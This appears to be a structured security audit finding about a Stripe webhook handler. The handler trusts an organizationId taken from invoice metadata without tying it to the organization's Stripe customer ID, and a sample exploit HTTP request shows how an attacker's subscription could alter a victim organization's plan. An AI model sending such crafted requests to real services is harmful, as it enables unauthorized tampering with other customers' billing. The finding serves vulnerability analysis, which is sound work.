diagnosis: Although the handler verifies the cryptographic Stripe webhook signature, it takes organizationId directly from client-controllable invoice.metadata without verifying that the Stripe customer ID (invoice.customer) matches the stripeCustomerId recorded on the target Organization. An attacker creating a cheap subscription under their own Stripe account can inject a victim's organizationId in checkout metadata to alter their subscription state or downgrade/upgrade victim plans.
exploit_request:
POST /webhooks/stripe HTTP/1.1
Host: api.saasapp.com
Stripe-Signature: t=1690000000,v1=valid_hmac_sha256_signature_from_stripe
Content-Type: application/json

{"type":"invoice.payment_succeeded","data":{"object":{"customer":"cus_attacker_112","metadata":{"organizationId":"org_enterprise_target_01"},"lines":{"data":[{"period":{"end":1750000000}}]}}}}
